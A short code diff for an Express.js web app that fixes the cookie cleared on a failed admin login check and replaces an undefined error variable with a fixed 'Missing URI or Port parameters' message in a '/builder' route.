@@ -21,7 +21,7 @@ function isAllowed(req, res, next) {
     let loginToken = db.maindb.get('admin.loginToken').value();
     if ('loginToken' in cookies) {
         if (cookies.loginToken === loginToken) next();
-        else res.clearCookie('token').redirect('/login');
+        else res.clearCookie('loginToken').redirect('/login');
     } else res.redirect('/login');
     // next();
 }
@@ -87,8 +87,8 @@ routes.post('/builder', isAllowed, (req, res) => {
         }
     });
     else {
-        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-        res.json({ error });
+        logManager.log(CONST.logTypes.error, "Build Failed - Missing URI or Port parameters");
+        res.json({ error: "Missing URI or Port parameters" });
     }
 });
 
